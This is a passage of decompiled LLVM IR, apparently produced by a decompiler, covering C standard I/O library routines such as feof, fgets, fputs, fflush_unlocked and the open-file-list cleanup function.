  uselistorder i32 %v1_804ecab, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804ecc1, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804ec3c, { 1, 2, 0 }
  uselistorder i32 %v1_804ec12, { 1, 2, 0 }
  uselistorder i32 %v0_804ec3c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804ebd7, { 1, 0 }
  uselistorder i32 %v1_804ebc6, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804ebcf, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804ebb9, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804ebaf, { 1, 0 }
  uselistorder i32 %v1_804eb91, { 1, 0 }
  uselistorder i32 %v0_804ebaf.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804eb74, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804eb6b, { 1, 2, 0 }
  uselistorder i32 %v0_804eb31, { 1, 0 }
  uselistorder i32 %v1_804eb23, { 1, 0 }
  uselistorder i32 %v1_804eb1e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804eb1c, { 2, 0, 1 }
  uselistorder i32 %v0_804eb3e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804ead9, { 1, 2, 0 }
  uselistorder i32 %v0_804eab1, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804eaa4.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804ea9d.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804eaa7, { 1, 2, 0 }
  uselistorder i32 %v6_804eaa5, { 0, 2, 1 }
  uselistorder i32 %v1_804eaa4, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804ea9d, { 2, 1, 0 }
  uselistorder i32 %v1_804ea95, { 1, 0 }
  uselistorder i32 %v1_804ea9d137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804ea8d, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804ea80, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804ea7b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804ea51, { 0, 2, 1 }
  uselistorder i32 %v2_804ea40, { 1, 0 }
  uselistorder i32 %v0_804ea3e, { 2, 0, 1 }
  uselistorder i32 %v4_804e9d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 42, 30, 29, 31, 32, 34, 33, 44, 43, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134573579, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8056e15.209 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ed93, { 1, 0 }
  uselistorder label %dec_label_pc_804ed90, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ed84, { 1, 0 }
  uselistorder label %dec_label_pc_804ed59, { 1, 0 }
  uselistorder label %dec_label_pc_804ed1e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ecca, { 1, 0 }
  uselistorder label %dec_label_pc_804ec9e, { 1, 0 }
  uselistorder label %dec_label_pc_804ec06, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ebd3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebaa, { 1, 0 }
  uselistorder label %dec_label_pc_804eb81, { 1, 0 }
  uselistorder label %dec_label_pc_804eb48, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804eaeb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eaa4, { 1, 0 }
  uselistorder label %dec_label_pc_804ea95, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8b, { 1, 0 }
  uselistorder label %dec_label_pc_804ea74, { 1, 0 }
  uselistorder label %dec_label_pc_804ea74.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_804ed9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_804eda6 = add i32 %tmp5, 52
  %v2_804eda6 = inttoptr i32 %v1_804eda6 to i32*
  %v3_804eda6 = load i32, i32* %v2_804eda6, align 4
  %v1_804eda9 = icmp eq i32 %v3_804eda6, 0
  %v1_804edab = icmp eq i1 %v1_804eda9, false
  br i1 %v1_804edab, label %dec_label_pc_804edcc.thread, label %dec_label_pc_804edd2

dec_label_pc_804edcc.thread:                      ; preds = %entry
  %v2_804edcc16 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ede3

dec_label_pc_804edd2:                             ; preds = %entry
  %v1_804edad = add i32 %tmp5, 56
  store i32 %v12_804ed9f, i32* @eax, align 4
  %v2_804edbc = call i32 @__pthread_return_void(i32 %v12_804ed9f, i32 134550911)
  %v1_804edc4 = call i32 @__pthread_return_0(i32 %v1_804edad)
  %v0_804edcc.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804edcc = inttoptr i32 %v0_804edcc.pre to i32*
  %v2_804edcc = load i32, i32* %v1_804edcc, align 4
  store i32 %v12_804ed9f, i32* @eax, align 4
  %v2_804eddb = call i32 @__pthread_return_void(i32 %v12_804ed9f, i32 1)
  br label %dec_label_pc_804ede3

dec_label_pc_804ede3:                             ; preds = %dec_label_pc_804edcc.thread, %dec_label_pc_804edd2
  %v0_804ede3 = phi i32 [ %v2_804edcc, %dec_label_pc_804edd2 ], [ %v2_804edcc16, %dec_label_pc_804edcc.thread ]
  %v1_804ede8 = and i32 %v0_804ede3, 4
  ret i32 %v1_804ede8

; uselistorder directives
  uselistorder i32 %v12_804ed9f, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ede3, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804edf0 = load i32, i32* @edi, align 4
  %v0_804edf1 = load i32, i32* @esi, align 4
  %v0_804edf2 = load i32, i32* @ebx, align 4
  %v12_804edf3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804edfa = add i32 %arg3, 52
  %v2_804edfa = inttoptr i32 %v1_804edfa to i32*
  %v3_804edfa = load i32, i32* %v2_804edfa, align 4
  store i32 %v3_804edfa, i32* @edi, align 4
  %v1_804edfd = icmp eq i32 %v3_804edfa, 0
  %v1_804edff = icmp eq i1 %v1_804edfd, false
  br i1 %v1_804edff, label %entry.dec_label_pc_804ee20_crit_edge, label %dec_label_pc_804ee01

entry.dec_label_pc_804ee20_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804ee20

dec_label_pc_804ee01:                             ; preds = %entry
  %v1_804ee01 = add i32 %arg3, 56
  store i32 %v1_804ee01, i32* @ebx, align 4
  store i32 %v12_804edf3, i32* @eax, align 4
  %v2_804ee10 = call i32 @__pthread_return_void(i32 %v12_804edf3, i32 134550911)
  %v0_804ee15 = load i32, i32* @ebx, align 4
  %v1_804ee18 = call i32 @__pthread_return_0(i32 %v0_804ee15)
  %v0_804ee21.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ee20

dec_label_pc_804ee20:                             ; preds = %entry.dec_label_pc_804ee20_crit_edge, %dec_label_pc_804ee01
  %v0_804ee21 = phi i32 [ %arg3, %entry.dec_label_pc_804ee20_crit_edge ], [ %v0_804ee21.pre, %dec_label_pc_804ee01 ]
  %v0_804ee20 = load i32, i32* @edx, align 4
  %v4_804ee2a = inttoptr i32 %arg1 to i8*
  %v5_804ee2a = call i32 @__GI_fgets_unlocked(i8* %v4_804ee2a, i32 %arg2, i32 %v0_804ee21, i32 %v0_804ee20)
  store i32 %v5_804ee2a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804edff, label %dec_label_pc_804ee49, label %dec_label_pc_804ee38

dec_label_pc_804ee38:                             ; preds = %dec_label_pc_804ee20
  store i32 %v12_804edf3, i32* @eax, align 4
  %v2_804ee41 = call i32 @__pthread_return_void(i32 %v12_804edf3, i32 1)
  %v0_804ee4c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ee49

dec_label_pc_804ee49:                             ; preds = %dec_label_pc_804ee20, %dec_label_pc_804ee38
  %v0_804ee4c = phi i32 [ %v5_804ee2a, %dec_label_pc_804ee20 ], [ %v0_804ee4c.pre, %dec_label_pc_804ee38 ]
  store i32 %v0_804edf2, i32* @ebx, align 4
  store i32 %v0_804edf1, i32* @esi, align 4
  store i32 %v0_804edf0, i32* @edi, align 4
  ret i32 %v0_804ee4c

; uselistorder directives
  uselistorder i32 %v12_804edf3, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ee49, { 1, 0 }
  uselistorder label %dec_label_pc_804ee20, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804ee54 = load i32, i32* @edi, align 4
  %v0_804ee55 = load i32, i32* @esi, align 4
  %v0_804ee56 = load i32, i32* @ebx, align 4
  %v12_804ee57 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804ee5e = add i32 %arg2, 52
  %v2_804ee5e = inttoptr i32 %v1_804ee5e to i32*
  %v3_804ee5e = load i32, i32* %v2_804ee5e, align 4
  store i32 %v3_804ee5e, i32* @edi, align 4
  %v1_804ee61 = icmp eq i32 %v3_804ee5e, 0
  %v1_804ee63 = icmp eq i1 %v1_804ee61, false
  br i1 %v1_804ee63, label %entry.dec_label_pc_804ee84_crit_edge, label %dec_label_pc_804ee65

entry.dec_label_pc_804ee84_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804ee84

dec_label_pc_804ee65:                             ; preds = %entry
  %v1_804ee65 = add i32 %arg2, 56
  store i32 %v1_804ee65, i32* @ebx, align 4
  store i32 %v12_804ee57, i32* @eax, align 4
  %v2_804ee74 = call i32 @__pthread_return_void(i32 %v12_804ee57, i32 134550911)
  %v0_804ee79 = load i32, i32* @ebx, align 4
  %v1_804ee7c = call i32 @__pthread_return_0(i32 %v0_804ee79)
  %v0_804ee86.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ee84

dec_label_pc_804ee84:                             ; preds = %entry.dec_label_pc_804ee84_crit_edge, %dec_label_pc_804ee65
  %v0_804ee86 = phi i32 [ %arg2, %entry.dec_label_pc_804ee84_crit_edge ], [ %v0_804ee86.pre, %dec_label_pc_804ee65 ]
  %v0_804ee84 = load i32, i32* @edx, align 4
  %v4_804ee8b = inttoptr i32 %arg1 to i8*
  %v5_804ee8b = call i32 @__GI_fputs_unlocked(i8* %v4_804ee8b, i32 %v0_804ee86, i32 %v0_804ee84, i32 %v0_804ee84)
  store i32 %v5_804ee8b, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ee63, label %dec_label_pc_804eeaa, label %dec_label_pc_804ee99

dec_label_pc_804ee99:                             ; preds = %dec_label_pc_804ee84
  store i32 %v12_804ee57, i32* @eax, align 4
  %v2_804eea2 = call i32 @__pthread_return_void(i32 %v12_804ee57, i32 1)
  %v0_804eead.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eeaa

dec_label_pc_804eeaa:                             ; preds = %dec_label_pc_804ee84, %dec_label_pc_804ee99
  %v0_804eead = phi i32 [ %v5_804ee8b, %dec_label_pc_804ee84 ], [ %v0_804eead.pre, %dec_label_pc_804ee99 ]
  store i32 %v0_804ee56, i32* @ebx, align 4
  store i32 %v0_804ee55, i32* @esi, align 4
  store i32 %v0_804ee54, i32* @edi, align 4
  ret i32 %v0_804eead

; uselistorder directives
  uselistorder i32 %v12_804ee57, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804eeaa, { 1, 0 }
  uselistorder label %dec_label_pc_804ee84, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804eec3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804eec3, i32* @eax, align 4
  %v2_804eec8 = call i32 @__pthread_return_void(i32 %v2_804eec3, i32 134550911)
  %v1_804eed4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ef4.195 to i32))
  %v0_804eed9 = load i32, i32* @global_var_805e184.196, align 4
  %v8_804eee1 = icmp eq i32 %v0_804eed9, 1
  %v1_804eee2 = icmp eq i1 %v8_804eee1, false
  br i1 %v1_804eee2, label %dec_label_pc_804ef79, label %dec_label_pc_804eee8

dec_label_pc_804eee8:                             ; preds = %entry
  %v0_804eee8 = load i32, i32* @global_var_805e188.197, align 8
  %tmp29 = icmp slt i32 %v0_804eee8, 1
  br i1 %tmp29, label %dec_label_pc_804ef79, label %dec_label_pc_804eef5

dec_label_pc_804eef5:                             ; preds = %dec_label_pc_804eee8
  store i32 0, i32* @esi, align 4
  %v2_804ef02 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804ef02, i32* @eax, align 4
  %v2_804ef07 = call i32 @__pthread_return_void(i32 %v2_804ef02, i32 134550911)
  %v1_804ef13 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059edc.199 to i32))
  %v0_804ef18 = load i32, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 8
  store i32 %v0_804ef18, i32* %edx.global-to-local, align 4
  %v1_804ef5a3 = icmp eq i32 %v0_804ef18, 0
  %v1_804ef5c10 = icmp eq i1 %v1_804ef5a3, false
  br i1 %v1_804ef5c10, label %dec_label_pc_804ef23, label %dec_label_pc_804ef5e

dec_label_pc_804ef23:                             ; preds = %dec_label_pc_804eef5, %dec_label_pc_804ef58
  %v0_804ef33 = phi i32 [ %v0_804ef58, %dec_label_pc_804ef58 ], [ %v0_804ef18, %dec_label_pc_804eef5 ]
  %v1_804ef2313 = inttoptr i32 %v0_804ef33 to i16*
  %v2_804ef23 = load i16, i16* %v1_804ef2313, align 2
  %v1_804ef2b = add i32 %v0_804ef33, 32
  %v2_804ef2b = inttoptr i32 %v1_804ef2b to i32*
  %v3_804ef2b = load i32, i32* %v2_804ef2b, align 4
  store i32 %v3_804ef2b, i32* @ebx, align 4
  %v1_804ef26 = and i16 %v2_804ef23, -32720
  %v6_804ef2e = icmp eq i16 %v1_804ef26, 48
  br i1 %v6_804ef2e, label %dec_label_pc_804ef37, label %dec_label_pc_804ef33

dec_label_pc_804ef33:                             ; preds = %dec_label_pc_804ef23
  store i32 %v0_804ef33, i32* @esi, align 4
  br label %dec_label_pc_804ef58

dec_label_pc_804ef37:                             ; preds = %dec_label_pc_804ef23
  %v0_804ef37 = load i32, i32* @esi, align 4
  %v1_804ef37 = icmp eq i32 %v0_804ef37, 0
  %v1_804ef39 = icmp eq i1 %v1_804ef37, false
  br i1 %v1_804ef39, label %dec_label_pc_804ef43, label %dec_label_pc_804ef3b

dec_label_pc_804ef3b:                             ; preds = %dec_label_pc_804ef37
  store i32 %v3_804ef2b, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 8
  br label %dec_label_pc_804ef46

dec_label_pc_804ef43:                             ; preds = %dec_label_pc_804ef37
  %v2_804ef43 = add i32 %v0_804ef37, 32
  %v3_804ef43 = inttoptr i32 %v2_804ef43 to i32*
  store i32 %v3_804ef2b, i32* %v3_804ef43, align 4
  %v0_804ef46.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ef46

dec_label_pc_804ef46:                             ; preds = %dec_label_pc_804ef3b, %dec_label_pc_804ef43
  %v0_804ef4f = phi i32 [ %v0_804ef33, %dec_label_pc_804ef3b ], [ %v0_804ef46.pre, %dec_label_pc_804ef43 ]
  %v1_804ef46 = add i32 %v0_804ef4f, 1
  %v2_804ef46 = inttoptr i32 %v1_804ef46 to i8*
  %v3_804ef46 = load i8, i8* %v2_804ef46, align 1
  %v4_804ef46 = and i8 %v3_804ef46, 32
  %v5_804ef46 = icmp eq i8 %v4_804ef46, 0
  br i1 %v5_804ef46, label %dec_label_pc_804ef58, label %dec_label_pc_804ef4c

dec_label_pc_804ef4c:                             ; preds = %dec_label_pc_804ef46
  %v1_804ef50 = call i32 @free(i32 %v0_804ef4f)
  br label %dec_label_pc_804ef58

dec_label_pc_804ef58:                             ; preds = %dec_label_pc_804ef46, %dec_label_pc_804ef33, %dec_label_pc_804ef4c
  %v0_804ef58 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef58, i32* %edx.global-to-local, align 4
  %v1_804ef5a = icmp eq i32 %v0_804ef58, 0
  %v1_804ef5c = icmp eq i1 %v1_804ef5a, false
  br i1 %v1_804ef5c, label %dec_label_pc_804ef23, label %dec_label_pc_804ef5e

dec_label_pc_804ef5e:                             ; preds = %dec_label_pc_804ef58, %dec_label_pc_804eef5
  store i32 %v2_804ef02, i32* @eax, align 4
  %v2_804ef67 = call i32 @__pthread_return_void(i32 %v2_804ef02, i32 1)
  store i32 0, i32* @global_var_805e188.197, align 8
  %v0_804ef79.pre = load i32, i32* @global_var_805e184.196, align 4
  br label %dec_label_pc_804ef79

dec_label_pc_804ef79:                             ; preds = %dec_label_pc_804eee8, %entry, %dec_label_pc_804ef5e
  %v0_804ef79 = phi i32 [ %v0_804eed9, %dec_label_pc_804eee8 ], [ %v0_804eed9, %entry ], [ %v0_804ef79.pre, %dec_label_pc_804ef5e ]
  %v1_804ef7e = add i32 %v0_804ef79, -1
  store i32 %v1_804ef7e, i32* @global_var_805e184.196, align 4
  store i32 %v2_804eec3, i32* @eax, align 4
  %v2_804ef8d = call i32 @__pthread_return_void(i32 %v2_804eec3, i32 1)
  ret i32 %v2_804ef8d

; uselistorder directives
  uselistorder i32 %v0_804ef58, { 1, 2, 0 }
  uselistorder i32 %v0_804ef33, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804eed9, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ef79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef46, { 1, 0 }
  uselistorder label %dec_label_pc_804ef23, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804ef98 = load i32, i32* @ebp, align 4
  %v0_804ef99 = load i32, i32* @edi, align 4
  %v0_804ef9a = load i32, i32* @esi, align 4
  %v0_804ef9b = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804efa1 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804efa1, i32* @ebx, align 4
  %v10_804efa5 = icmp eq i16* %arg1, inttoptr (i32 134586072 to i16*)
  br i1 %v10_804efa5, label %dec_label_pc_804efba, label %dec_label_pc_804efad

dec_label_pc_804efad:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_804efb2 = icmp eq i16* %arg1, null
  %v1_804efb4 = icmp eq i1 %v2_804efb2, false
  br i1 %v1_804efb4, label %dec_label_pc_804f0a9, label %dec_label_pc_804efba

dec_label_pc_804efba:                             ; preds = %dec_label_pc_804efad, %entry
  store i32 0, i32* @edi, align 4
  %v2_804efc7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804efc7, i32* @ebx, align 4
  %v2_804efcc = call i32 @__pthread_return_void(i32 %v2_804efc7, i32 134550911)
  %v1_804efd8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ef4.195 to i32))
  store i32 ptrtoint (i32* @global_var_8059ef4.195 to i32), i32* @ecx, align 4
  %v0_804efde = load i32, i32* @global_var_805e184.196, align 4
  %v1_804efe4 = add i32 %v0_804efde, 1
  store i32 %v1_804efe4, i32* @eax, align 4
  store i32 %v1_804efe4, i32* @global_var_805e184.196, align 4
  %v2_804efed = call i32 @__pthread_return_void(i32 %v2_804efc7, i32 1)
  store i32 %v2_804efed, i32* @eax, align 4
  %v2_804f000 = call i32 @__pthread_return_void(i32 %v2_804efc7, i32 134550911)
  %v1_804f00c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059edc.199 to i32))
  store i32 ptrtoint (i32* @global_var_8059edc.199 to i32), i32* @eax, align 4
  %v0_804f015 = load i32, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 8
  store i32 %v0_804f015, i32* @esi, align 4
  %v2_804f01c = call i32 @__pthread_return_void(i32 %v2_804efc7, i32 1)
  %v0_804f09e1 = load i32, i32* @esi, align 4
  %v1_804f09e2 = icmp eq i32 %v0_804f09e1, 0
  %v1_804f0a09 = icmp eq i1 %v1_804f09e2, false
  br i1 %v1_804f0a09, label %dec_label_pc_804f026, label %dec_label_pc_804f0a2

dec_label_pc_804f026:                             ; preds = %dec_label_pc_804efba, %dec_label_pc_804f09b
  %v0_804f034 = phi i32 [ %v3_804f09b, %dec_label_pc_804f09b ], [ %v0_804f09e1, %dec_label_pc_804efba ]
  %v1_804f026 = inttoptr i32 %v0_804f034 to i8*
  %v2_804f026 = load i8, i8* %v1_804f026, align 1
  %v3_804f026 = and i8 %v2_804f026, 64
  %v4_804f026 = icmp eq i8 %v3_804f026, 0
  br i1 %v4_804f026, label %dec_label_pc_804f09b, label %dec_label_pc_804f02b

dec_label_pc_804f02b:                             ; preds = %dec_label_pc_804f026
  %v0_804f02b = load i32, i32* @global_var_8059f0c.198, align 4
  %v9_804f02b = icmp eq i32 %v0_804f02b, 2
  br i1 %v9_804f02b, label %dec_label_pc_804f053, label %dec_label_pc_804f034

dec_label_pc_804f034:                             ; preds = %dec_label_pc_804f02b
  %v1_804f034 = add i32 %v0_804f034, 56
  store i32 %v1_804f034, i32* @ebx, align 4
  store i32 %v2_804efc7, i32* @eax, align 4
  %v2_804f043 = call i32 @__pthread_return_void(i32 %v2_804efc7, i32 134550911)
  %v0_804f048 = load i32, i32* @ebx, align 4
  %v1_804f04b = call i32 @__pthread_return_0(i32 %v0_804f048)
  %v1_804f055.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f053

dec_label_pc_804f053:                             ; preds = %dec_label_pc_804f02b, %dec_label_pc_804f034
  %v0_804f065 = phi i32 [ %v0_804f034, %dec_label_pc_804f02b ], [ %v1_804f055.pre, %dec_label_pc_804f034 ]
  %v0_804f053 = load i32, i32* @ebp, align 4
  %v2_804f055 = inttoptr i32 %v0_804f065 to i32*
  %v3_804f055 = load i32, i32* %v2_804f055, align 4
  %v4_804f055 = or i32 %v3_804f055, %v0_804f053
  %v2_804f057 = urem i32 %v4_804f055, 65536
  %v9_804f057 = and i32 %v2_804f057, 832
  %v2_804f05b = icmp eq i32 %v9_804f057, 320
  %v1_804f060 = icmp eq i1 %v2_804f05b, false
  br i1 %v1_804f060, label %dec_label_pc_804f081, label %dec_label_pc_804f062

dec_label_pc_804f062:                             ; preds = %dec_label_pc_804f053
  %v1_804f066 = call i32 @__stdio_wcommit(i32 %v0_804f065)
  %v1_804f06e = icmp eq i32 %v1_804f066, 0
  br i1 %v1_804f06e, label %dec_label_pc_804f077, label %dec_label_pc_804f072

dec_label_pc_804f072:                             ; preds = %dec_label_pc_804f062
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804f081

dec_label_pc_804f077:                             ; preds = %dec_label_pc_804f062
  %v0_804f077 = load i32, i32* @esi, align 4
  %v1_804f077 = inttoptr i32 %v0_804f077 to i16*
  %v2_804f077 = load i16, i16* %v1_804f077, align 2
  %v3_804f077 = and i16 %v2_804f077, -65
  store i16 %v3_804f077, i16* %v1_804f077, align 2
  %v0_804f07b = load i32, i32* @esi, align 4
  %v1_804f07b = add i32 %v0_804f07b, 8
  %v2_804f07b = inttoptr i32 %v1_804f07b to i32*
  %v3_804f07b = load i32, i32* %v2_804f07b, align 4
  %v2_804f07e = add i32 %v0_804f07b, 28
  %v3_804f07e = inttoptr i32 %v2_804f07e to i32*
  store i32 %v3_804f07b, i32* %v3_804f07e, align 4
  br label %dec_label_pc_804f081

dec_label_pc_804f081:                             ; preds = %dec_label_pc_804f053, %dec_label_pc_804f072, %dec_label_pc_804f077
  %v0_804f081 = load i32, i32* @global_var_8059f0c.198, align 4
  %v9_804f081 = icmp eq i32 %v0_804f081, 2
  br i1 %v9_804f081, label %dec_label_pc_804f09b, label %dec_label_pc_804f08a

dec_label_pc_804f08a:                             ; preds = %dec_label_pc_804f081
  store i32 %v2_804efc7, i32* @eax, align 4
  %v2_804f093 = call i32 @__pthread_return_void(i32 %v2_804efc7, i32 1)
  br label %dec_label_pc_804f09b

dec_label_pc_804f09b:                             ; preds = %dec_label_pc_804f081, %dec_label_pc_804f026, %dec_label_pc_804f08a
  %v0_804f09b = load i32, i32* @esi, align 4
  %v1_804f09b = add i32 %v0_804f09b, 32
  %v2_804f09b = inttoptr i32 %v1_804f09b to i32*
  %v3_804f09b = load i32, i32* %v2_804f09b, align 4
  store i32 %v3_804f09b, i32* @esi, align 4
  %v1_804f09e = icmp eq i32 %v3_804f09b, 0
  %v1_804f0a0 = icmp eq i1 %v1_804f09e, false
  br i1 %v1_804f0a0, label %dec_label_pc_804f026, label %dec_label_pc_804f0a2

dec_label_pc_804f0a2:                             ; preds = %dec_label_pc_804f09b, %dec_label_pc_804efba
  %v0_804f0a2 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804f0cf

dec_label_pc_804f0a9:                             ; preds = %dec_label_pc_804efad
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804f0ab = load i8, i8* %tmp23, align 1
  %v4_804f0ab = and i8 %v3_804f0ab, 64
  %v5_804f0ab = icmp eq i8 %v4_804f0ab, 0
  br i1 %v5_804f0ab, label %dec_label_pc_804f0cf, label %dec_label_pc_804f0b0

dec_label_pc_804f0b0:                             ; preds = %dec_label_pc_804f0a9
  store i32 -1, i32* @edi, align 4
  %v1_804f0b7 = call i32 @__stdio_wcommit(i32 %v4_804efa1)
  %v1_804f0bf = icmp eq i32 %v1_804f0b7, 0
  %v1_804f0c1 = icmp eq i1 %v1_804f0bf, false
  br i1 %v1_804f0c1, label %dec_label_pc_804f0cf, label %dec_label_pc_804f0c3

dec_label_pc_804f0c3:                             ; preds = %dec_label_pc_804f0b0
  %v3_804f0c3 = load i16, i16* %arg1, align 2
  %v4_804f0c3 = and i16 %v3_804f0c3, -65
  store i16 %v4_804f0c3, i16* %arg1, align 2
  %v2_804f0c7 = add i32 %v4_804efa1, 8
  %v3_804f0c7 = inttoptr i32 %v2_804f0c7 to i32*
  %v4_804f0c7 = load i32, i32* %v3_804f0c7, align 4
  %v3_804f0ca = add i32 %v4_804efa1, 28
  %v4_804f0ca = inttoptr i32 %v3_804f0ca to i32*
  store i32 %v4_804f0c7, i32* %v4_804f0ca, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f0cf

dec_label_pc_804f0cf:                             ; preds = %dec_label_pc_804f0b0, %dec_label_pc_804f0a9, %dec_label_pc_804f0a2, %dec_label_pc_804f0c3
  %v0_804f0d2 = load i32, i32* @edi, align 4
  store i32 %v0_804ef9b, i32* @ebx, align 4
  store i32 %v0_804ef9a, i32* @esi, align 4
  store i32 %v0_804ef99, i32* @edi, align 4
  store i32 %v0_804ef98, i32* @ebp, align 4
  ret i32 %v0_804f0d2

; uselistorder directives
  uselistorder i32 %v3_804f09b, { 1, 2, 0 }
  uselistorder i32 %v2_804efc7, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_8059ed8.200 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805e184.196, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8059ef4.195 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_804f0cf, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f09b, { 2, 0, 1 }
